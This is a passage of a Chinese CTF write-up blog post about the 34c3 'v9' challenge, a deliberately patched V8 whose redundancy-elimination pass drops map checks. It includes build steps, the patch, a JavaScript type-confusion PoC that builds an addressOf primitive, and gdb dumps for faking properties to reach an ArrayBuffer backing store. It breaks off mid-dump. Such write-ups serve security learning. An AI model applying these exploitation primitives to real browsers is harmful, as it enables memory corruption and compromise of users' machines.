@@ -1,0 +1,1425 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="34c3 CTF v9题解环境搭建patch文件在v9 1234567mkdir v9 &amp;amp;&amp;amp; cd v9fetch v8 &amp;amp;&amp;amp; cd v8           # see https://github.com/v8/v8/wiki/Building-from-Sourcegit checkout 6.3.292.48gclient syncpatch -p1 &amp;lt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="34c3 CTF v9题解">
+<meta property="og:url" content="http://ama2in9.top/2021/05/26/34c3-v9/index.html">
+<meta property="og:site_name" content="Ama2in9">
+<meta property="og:description" content="34c3 CTF v9题解环境搭建patch文件在v9 1234567mkdir v9 &amp;amp;&amp;amp; cd v9fetch v8 &amp;amp;&amp;amp; cd v8           # see https://github.com/v8/v8/wiki/Building-from-Sourcegit checkout 6.3.292.48gclient syncpatch -p1 &amp;lt">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ama2in9.top/2021/05/26/34c3-v9/1.png">
+<meta property="og:updated_time" content="2021-05-26T03:15:05.924Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="34c3 CTF v9题解">
+<meta name="twitter:description" content="34c3 CTF v9题解环境搭建patch文件在v9 1234567mkdir v9 &amp;amp;&amp;amp; cd v9fetch v8 &amp;amp;&amp;amp; cd v8           # see https://github.com/v8/v8/wiki/Building-from-Sourcegit checkout 6.3.292.48gclient syncpatch -p1 &amp;lt">
+<meta name="twitter:image" content="http://ama2in9.top/2021/05/26/34c3-v9/1.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://ama2in9.top/2021/05/26/34c3-v9/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>34c3 CTF v9题解 | Ama2in9</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ama2in9</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ama2in9.top/2021/05/26/34c3-v9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ama2in9">
+      <meta itemprop="description" content="Seeing how far I have been.">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ama2in9">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">34c3 CTF v9题解
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2021-05-26 11:11:36 / Modified: 11:15:05" itemprop="dateCreated datePublished" datetime="2021-05-26T11:11:36+08:00">2021-05-26</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2021/05/26/34c3-v9/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/05/26/34c3-v9/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2021/05/26/34c3-v9/" class="leancloud_visitors" data-flag-title="34c3 CTF v9题解">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="34c3-CTF-v9题解"><a href="#34c3-CTF-v9题解" class="headerlink" title="34c3 CTF v9题解"></a>34c3 CTF v9题解</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>patch文件在<a href="https://github.com/saelo/v9" target="_blank" rel="noopener">v9</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir v9 &amp;&amp; <span class="built_in">cd</span> v9</span><br><span class="line">fetch v8 &amp;&amp; <span class="built_in">cd</span> v8           <span class="comment"># see https://github.com/v8/v8/wiki/Building-from-Source</span></span><br><span class="line">git checkout 6.3.292.48</span><br><span class="line">gclient sync</span><br><span class="line">patch -p1 &lt; /path/to/v9.patch</span><br><span class="line">./tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>补丁如下，在<code>RedundancyElimination::Reduce</code>函数中增加了对于<code>CheckMaps</code>节点的<code>Reduce</code>，调用函数<code>ReduceCheckNode(node)</code>。另一处在函数<code>IsCompatibleCheck</code>中检查第2个参数节点的<code>maps</code>是否包含第1个参数节点的<code>maps</code>，如果存在包含关系则返回<code>true</code>。</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/redundancy-elimination.cc b/src/compiler/redundancy-elimination.cc</span><br><span class="line">index 3a40e8d..cb51acc 100644</span><br><span class="line"><span class="comment">--- a/src/compiler/redundancy-elimination.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/redundancy-elimination.cc</span></span><br><span class="line"><span class="meta">@@ -5,6 +5,8 @@</span></span><br><span class="line"> #include "src/compiler/redundancy-elimination.h"</span><br><span class="line"> </span><br><span class="line"> #include "src/compiler/node-properties.h"</span><br><span class="line"><span class="addition">+#include "src/compiler/simplified-operator.h"</span></span><br><span class="line"><span class="addition">+#include "src/objects-inl.h"</span></span><br><span class="line"> </span><br><span class="line"> namespace v8 &#123;</span><br><span class="line"> namespace internal &#123;</span><br><span class="line">@@ -23,6 +25,7 @@ Reduction RedundancyElimination::Reduce(Node* node) &#123;</span><br><span class="line">     case IrOpcode::kCheckHeapObject:</span><br><span class="line">     case IrOpcode::kCheckIf:</span><br><span class="line">     case IrOpcode::kCheckInternalizedString:</span><br><span class="line"><span class="addition">+    case IrOpcode::kCheckMaps:</span></span><br><span class="line">     case IrOpcode::kCheckNumber:</span><br><span class="line">     case IrOpcode::kCheckReceiver:</span><br><span class="line">     case IrOpcode::kCheckSmi:</span><br><span class="line">@@ -129,6 +132,14 @@ bool IsCompatibleCheck(Node const* a, Node const* b) &#123;</span><br><span class="line">     if (a-&gt;opcode() == IrOpcode::kCheckInternalizedString &amp;&amp;</span><br><span class="line">         b-&gt;opcode() == IrOpcode::kCheckString) &#123;</span><br><span class="line">       // CheckInternalizedString(node) implies CheckString(node)</span><br><span class="line"><span class="addition">+    &#125; else if (a-&gt;opcode() == IrOpcode::kCheckMaps &amp;&amp;</span></span><br><span class="line"><span class="addition">+               b-&gt;opcode() == IrOpcode::kCheckMaps) &#123;</span></span><br><span class="line"><span class="addition">+      // CheckMaps are compatible if the first checks a subset of the second.</span></span><br><span class="line"><span class="addition">+      ZoneHandleSet&lt;Map&gt; const&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span></span><br><span class="line"><span class="addition">+      ZoneHandleSet&lt;Map&gt; const&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span></span><br><span class="line"><span class="addition">+      if (!b_maps.contains(a_maps)) &#123;</span></span><br><span class="line"><span class="addition">+        return false;</span></span><br><span class="line"><span class="addition">+      &#125;</span></span><br><span class="line">     &#125; else &#123;</span><br><span class="line">       return false;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+<p>查看<code>IsCompatibleCheck</code>函数的调用，最终发现存在调用链<code>ReduceCheckNode-&gt;EffectPathChecks-&gt;IsCompatibleCheck</code>。对于每个参数节点使用<code>LookupCheck</code>函数查看是否有其他的check可以支配node的检查，如果有的话就调用<code>ReplaceWithValue(node, check)</code>将<code>node</code>节点替换为<code>check</code>节点，check节点将作为<code>reduction</code>返回调用函数。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">RedundancyElimination::ReduceCheckNode</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  Node* <span class="keyword">const</span> effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">  EffectPathChecks <span class="keyword">const</span>* checks = node_checks_.Get(effect);</span><br><span class="line">  <span class="comment">// If we do not know anything about the predecessor, do not propagate just yet</span></span><br><span class="line">  <span class="comment">// because we will have to recompute anyway once we compute the predecessor.</span></span><br><span class="line">  <span class="keyword">if</span> (checks == <span class="literal">nullptr</span>) <span class="keyword">return</span> NoChange();</span><br><span class="line">  <span class="comment">// See if we have another check that dominates us.</span></span><br><span class="line">  <span class="keyword">if</span> (Node* check = checks-&gt;LookupCheck(node)) &#123;</span><br><span class="line">    ReplaceWithValue(node, check);</span><br><span class="line">    <span class="keyword">return</span> Replace(check);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Learn from this check.</span></span><br><span class="line">  <span class="keyword">return</span> UpdateChecks(node, checks-&gt;AddCheck(zone(), node));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>v8使用类似链表的形式保存所有的<code>check</code>节点(CheckHeapObject、CheckMaps等)，<code>Check-&gt;next</code>指向下一个<code>Check</code>结构体，<code>Check-&gt;node</code>表示检查对应的节点。在<code>LookupCheck</code>函数中遍历所有的<code>check-&gt;node</code>，检查有无节点同参数节点<code>node</code>相兼容。如果存在某个check节点，其maps节点被node的节点所包含，则返回true，进而导致node节点被<code>check-&gt;node</code>节点所替换</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Node* RedundancyElimination::EffectPathChecks::LookupCheck(Node* node) <span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (Check <span class="keyword">const</span>* check = head_; check != <span class="literal">nullptr</span>; check = check-&gt;next) &#123;</span><br><span class="line">    <span class="keyword">if</span> (IsCompatibleCheck(check-&gt;node, node)) &#123;</span><br><span class="line">      DCHECK(!check-&gt;node-&gt;IsDead());</span><br><span class="line">      <span class="keyword">return</span> check-&gt;node;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查看<code>pipeline.cc</code>中调用该节点优化的<code>phase</code>，发现在<code>LoadEliminationPhase</code>和<code>EarlyOptimizationPhase</code>两个阶段中调用了该函数。</p>
+<p>因为之前刚调了一个issue能让<code>arr.length = -1</code>，在做这题时开始也想搞到一样的效果，初步想法是将classA包装在一个obj中，初次访问classA后在callback中修改obj的classA为arr，进而修改其length字段的位置为-1。后来试了蛮多代码都没法触发类型混淆，猜测是对象包装对象的话中间的checkMaps比较复杂，不一定能通过patch的代码给消除所有的检查，刚好这次学习也是为了积攒新的漏洞利用的技巧，翻阅了几个师傅的博客后学到了几种不同的利用方式，这里总结一下。</p>
+<h2 id="伪造Properties实现任意地址读写"><a href="#伪造Properties实现任意地址读写" class="headerlink" title="伪造Properties实现任意地址读写"></a>伪造Properties实现任意地址读写</h2><p>参考<a href="https://de4dcr0w.github.io/34c3ctf-chrome-pwn%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">de4dcr0w-34c3ctf-chrome-pwn分析</a></p>
+<h3 id="PoC构造"><a href="#PoC构造" class="headerlink" title="PoC构造"></a>PoC构造</h3><p>我们可以通过字典对象构造类型混淆，在<code>foo</code>函数中首先访问<code>obj.b</code>，此时有对obj的maps的检查，最后return时我们仍返回此对象，检查的maps依然是对obj做的，因此这里的check在patch后的lookup来看是多余的检查，因而会被消除掉，在回调函数中我们修改<code>obj.b=arr</code>，返回时由于没有类型检查会将对象地址当作浮点数返回，从而leak出任意对象的地址。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">obj,callback</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> x = obj.b;</span><br><span class="line">  callback();</span><br><span class="line">  <span class="keyword">return</span> obj.b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">10</span>);</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line"><span class="keyword">var</span> hh = &#123;<span class="attr">b</span>:<span class="number">13.37</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  hh.b = arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> addr = f2i(foo(hh,evil));</span><br></pre></td></tr></table></figure>
+<h3 id="addressOf原语"><a href="#addressOf原语" class="headerlink" title="addressOf原语"></a>addressOf原语</h3><p>上面的PoC即可构造出addressOf原语</p>
+<h3 id="fake-properties"><a href="#fake-properties" class="headerlink" title="fake properties"></a>fake properties</h3><p>我们首先来看下浮点数对象的内存布局，<code>obj_addr+8</code>存储<code>properties</code>，<code>properties+0x10</code>存储<code>obj.b</code>的对象地址，<code>obj_b_addr+0x8</code>存储obj.b的值。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x3de5a098ccb1: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x9fb0138c661 [FastProperties]</span><br><span class="line"> - prototype = 0x5e7870846a9</span><br><span class="line"> - elements = 0x10122a982251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x3de5a098cd59 &lt;PropertyArray[3]&gt; &#123;</span><br><span class="line">    <span class="comment">#a: &lt;unboxed double&gt; 1.1 (data field 0)</span></span><br><span class="line">    <span class="comment">#b: 0x3de5a098cd81 &lt;MutableNumber 1.337&gt; (data field 1) properties[0]</span></span><br><span class="line"> &#125;</span><br><span class="line">0x9fb0138c661: [Map]</span><br><span class="line"> - <span class="built_in">type</span>: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 1</span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 2</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x9fb0138c611 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) <span class="comment">#2: 0x3de5a098cd09 &lt;FixedArray[8]&gt;</span></span><br><span class="line"> - layout descriptor: 0x100000000</span><br><span class="line"> - prototype: 0x5e7870846a9 &lt;Object map = 0x9fb013822a1&gt;</span><br><span class="line"> - constructor: 0x5e7870846e1 &lt;JSFunction Object (sfi = 0x10122a9a3b59)&gt;</span><br><span class="line"> - dependent code: 0x10122a982251 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line">gdb-peda$ telescope 0x3de5a098ccb1-1</span><br><span class="line">0000| 0x3de5a098ccb0 --&gt; 0x9fb0138c661 --&gt; 0x400003feedac022 </span><br><span class="line">0008| 0x3de5a098ccb8 --&gt; 0x3de5a098cd59([1] properties) --&gt; 0x3feedac031 </span><br><span class="line">0016| 0x3de5a098ccc0 --&gt; 0x10122a982251 --&gt; 0x3feedac022 </span><br><span class="line">gdb-peda$ telescope 0x3de5a098cd59-1</span><br><span class="line">0000| 0x3de5a098cd58 --&gt; 0x3feedac031a1 --&gt; 0x3feedac022 </span><br><span class="line">0008| 0x3de5a098cd60 --&gt; 0x300000000 </span><br><span class="line">0016| 0x3de5a098cd68 --&gt; 0x3de5a098cd81([2] obj.b) --&gt; 0x3100003feedac02e</span><br><span class="line">gdb-peda$ telescope 0x3de5a098cd81-1</span><br><span class="line">0000| 0x3de5a098cd80 --&gt; 0x3feedac02e31 --&gt; 0x200003feedac022 </span><br><span class="line">0008| 0x3de5a098cd88 --&gt; 0x3ff5645a1cac0831([3] obj.b.val)</span><br><span class="line">0016| 0x3de5a098cd90 --&gt; 0xdeadbeedbeadbeef</span><br><span class="line">gdb-peda$ p &#123;double&#125; 0x3de5a098cd88</span><br><span class="line"><span class="variable">$1</span> = 1.337</span><br></pre></td></tr></table></figure>
+<p>通过之前的PoC我们已经能够修改<code>obj.b</code>为其他对象<code>fake_obj</code>，当我们使用<code>obj.b=val</code>赋值时对应到内存区域实际是对<code>fake_obj-&gt;properties</code>进行赋值.</p>
+<p>构造如下的PoC，覆盖<code>hh.b=victim</code>调试观察</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> victim = &#123;<span class="attr">inline</span>:<span class="number">42</span>&#125;;</span><br><span class="line">victim.offset0 = &#123;&#125;;</span><br><span class="line">victim.offset8 = &#123;&#125;;</span><br><span class="line">victim.offset16 = &#123;&#125;;</span><br></pre></td></tr></table></figure>
+<p>观察发现<code>victim.offsetx</code>对象的位置均在<code>properties</code>后，假如我们伪造<code>properties</code>为<code>ArrayBuffer_addr</code>，则<code>victim.offset16</code>刚好对应到<code>ArrayBuffer-&gt;backing_store</code>的存储位置。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x116f34503bb1: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x23b69238c8e1 [FastProperties]</span><br><span class="line"> - prototype = 0x3f5df9f846a9</span><br><span class="line"> - elements = 0x38339e002251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x38339e0049e9 &lt;PropertyArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#b: 0x116f34569bf9 &lt;Object map = 0x23b69238c891&gt; (data field 0)</span></span><br><span class="line">DebugPrint: 0x116f34569bf9: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x23b69238c891 [FastProperties]</span><br><span class="line"> - prototype = 0x3f5df9f846a9</span><br><span class="line"> - elements = 0x38339e002251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x116f34569cd9 &lt;PropertyArray[3]&gt; &#123;</span><br><span class="line">    <span class="comment">#inline: 42 (data field 0)</span></span><br><span class="line">    <span class="comment">#offset0: 0x116f34569c51 &lt;Object map = 0x23b692382391&gt; (data field 1) properties[0]</span></span><br><span class="line">    <span class="comment">#offset8: 0x116f34569d01 &lt;Object map = 0x23b692382391&gt; (data field 2) properties[1]</span></span><br><span class="line">    <span class="comment">#offset16: 0x116f34569da1 &lt;Object map = 0x23b692382391&gt; (data field 3) properties[2]</span></span><br><span class="line"> &#125;</span><br><span class="line">gdb-peda$ telescope 0x116f34569bf9-1</span><br><span class="line">0000| 0x116f34569bf8 --&gt; 0x23b69238c891 --&gt; 0x400002b0c15a822 </span><br><span class="line">0008| 0x116f34569c00 --&gt; 0x116f34569cd9 --&gt; 0x2b0c15a831(obj.b的val位置，对应victim-&gt;properties)</span><br><span class="line">gdb-peda$ telescope 0x116f34569cd9-1</span><br><span class="line">0000| 0x116f34569cd8 --&gt; 0x2b0c15a831a1 --&gt; 0x2b0c15a822 </span><br><span class="line">0008| 0x116f34569ce0 --&gt; 0x300000000 </span><br><span class="line">0016| 0x116f34569ce8 --&gt; 0x116f34569c51 --&gt; 0x51000023b6923823(offset0)</span><br><span class="line">0024| 0x116f34569cf0 --&gt; 0x116f34569d01 --&gt; 0x51000023b6923823(offset8)</span><br><span class="line">0032| 0x116f34569cf8 --&gt; 0x116f34569da1 --&gt; 0x51000023b6923823(offset16)</span><br></pre></td></tr></table></figure>
+<p>如下所示为我们构造出<code>backing_store</code>同<code>offset16</code>位置相同的情形。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 